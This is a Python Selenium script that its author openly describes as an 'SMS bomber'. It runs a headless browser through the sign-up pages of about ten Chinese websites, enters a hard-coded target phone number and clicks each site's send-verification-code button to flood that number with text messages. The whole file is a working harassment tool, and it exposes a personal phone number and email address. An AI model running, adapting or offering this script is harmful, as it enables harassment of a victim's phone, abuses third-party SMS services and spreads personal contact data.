# *-UTF-8-*
# @Time    : 2019/8/15 16:46
# @Author  : Zurich.Alcazar
# @Email   : 1178824808@qq.com
# @File    : my_spider.py
# @Software: PyCharm

from selenium import webdriver
import time
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

chrome_options = Options()
chrome_options.add_argument('--headless')
# tel = input('请输入您要短信轰炸的对象（仅支持亲密友好的对象）:')
broswer = webdriver.Chrome(options=chrome_options)
tel = 13081855970

# 定位,并输入手机号码
def tel_num_try(input_tel):
    try:
        # bot1=broswer.find_element_by_id(input_tel)
        bot1 = broswer.find_element_by_css_selector(input_tel)
        bot1.click()
        bot1.send_keys(tel)
        print("使用id定位中...")
    except:
        # print(broswer.page_source())
        bots2 = broswer.find_element(By.CLASS_NAME, input_tel)
        time.sleep(1)
        bots2.send_keys(tel)
        print("使用class_name定位中...")

    # else:
    #     bots3 = broswer.find_element_by_css_selector(("." + input_tel))
    #     bots3.click()
    #     print("使用css_selector定位中...")
    # finally:
    #     bots4 = broswer.find_element_by_name("wd")
    #     bots4.click()
    #     print("使用name定位中...")

# 定位并点击
def tel_power_try(btn):
    try:
        # bot1 = broswer.find_element_by_id(btn)
        bot1 = broswer.find_element_by_css_selector(btn)
        bot1.click()
        bot1.click()
        time.sleep(1)
        print("使用id定位中...")
    except:
        bots2 = broswer.find_element(By.CLASS_NAME, btn)
        bots2.click()
        # bots2.click()
        time.sleep(1)
        print("使用class_name定位中...")
    # except 2:
    #     bots2 = broswer.find_element_by_xpath(btn)
    #     bots2.click()
    #     time.sleep(2)
    #     print("使用xpath定位中...")


# 模板：两步获取验证码：手机号定位，验证码定位；
def tel_get_2(url,input_tel,btn):
    # 获取地址
    broswer.get(url)
    # 定位手机号输入
    tel_num_try(input_tel)
    # 定位"获取验证码"按钮
    tel_power_try(btn)


# 模板：三步获取验证码：登录定位，手机号定位，验证码定位；
def tel_get_3(url,into,input_tel,btn):
    # 获取地址
    broswer.get(url)

    tel_power_try(into)

    # 定位手机号输入
    tel_num_try(input_tel)

    # 定位"获取验证码"按钮
    tel_power_try(btn)

# 模板：三步获取验证码：手机定位，滑动验证码检验（变速滑动）、验证码定位；

# 模板：三步获取验证码：手机定位，图像文字识别检验（涉及太广，）、验证码定位；


# 短信轰炸机：感觉自己在犯法的边缘不断试探
class Spider_tel():
    def __init__(self):
        pass

    def TongCheng_com(self):
        url = "https://passport.58.com/reg/?path=https%3A//gz.58.com/&PGTID=0d100000-0000-33f9-63ec-9ca2641f5e25&ClickID=3"
        input_tel = 'phone'
        btn = 'getcode'
        tel_get_2(url,input_tel,btn)

    def Guazi_com(self):
        url = "https://www.guazi.com/qinhuangdao/dazhong/"
        into = 'js-login-new'
        input_tel = "phone-login-input"
        btn = 'get-code'

        tel_get_3(url,into, input_tel, btn)

    def JianShu(self):
        url = "https://www.jianshu.com/sign_up"
        input_tel = 'user_mobile_number'
        btn = 'send_code'
        tel_get_2(url,input_tel,btn)

    def SuNingYiGou(self):
        url = "https://reg.suning.com/person.do?myTargetUrl=https%3A%2F%2Fwww.suning.com%2F%3Fsafp%3Dd488778a.uzD.0.acf325284e"
        into = 'agree-btn'
        input_tel = "mobileAlias"
        btn = 'sendSmsCode'

        tel_get_3(url,into, input_tel, btn)

    def FanKe(self):
        url = "https://www.fkw.com/reg.html"
        input_tel = 'acct'
        btn ='button'
        tel_get_2(url,input_tel,btn)


    def WangyiYun(self):
        # 难啃系数3颗星
        url = "https://id.163yun.com/register?referrer=https://dun.163.com/dashboard&h=yd&"
        into = 'yidun_tips__icon'
        input_tel = "m-input m-input-large"
        btn = 'm-btn'
        tel_get_3(url,into, input_tel, btn)

    def BeiRui(self):
        url = 'https://console.oray.com/passport/register.html?fromurl=http%3A%2F%2Fdomain .oray.com%2F'
        into = 'btn btn-primary'
        input_tel = "mobile"
        btn = "btn btn-primary close"
        tel_get_3(url,into, input_tel, btn)

    def ZhuHu(self):
        # 难度系数：5(动态加载)
        url = "https://www.zhihu.com/signin?next=%2Ffollow"
        input_tel = 'SignFlowInput-errorMask undefined SignFlowInput-requiredErrorMask'
        btn = 'Button CountingDownButton SignFlow-smsInputButton Button--plain'
        tel_get_2(url, input_tel, btn)

    def HuaWeiShangCheng(self):
        url = "https://id1.cloud.huawei.com/CAS/portal/userRegister/regbyphone.html?service=https://www.vmall.com/account/caslogin&loginChannel=26000000&reqClientType=26&lang=zh-cn"
        into = 'geetest_radar_tip'
        input_tel = "text input-number"
        btn = 'getValiCode'

        tel_get_3(url,into, input_tel, btn)

    def XueJia(self):
        url = "https://cn.student.com/au/adelaide?utm_source=baidu&utm_medium=cpc&utm_campaign=3_destination_au_pc&utm_content=3_adelaide_g_web_p&utm_term=adelaide%E7%A7%9F%E6%88%BF%E7%BD%91#sign-up"
        input_tel = 'input-field__input'
        btn ='send-button__text'
        tel_get_2(url,input_tel,btn)


    def run(self):
        # 调用
        self.TongCheng_com()
        print("__________________")
        # self.Guazi_com()
        # self.JianShu()

        # self.FanKe()
        # self.SuNingYiGou()
        # self.WangyiYun()
        # self.BeiRui()
        # self.ZhuHu()
        # self.HuaWeiShangCheng()
        # self.XueJia()

s = Spider_tel()
s.run()











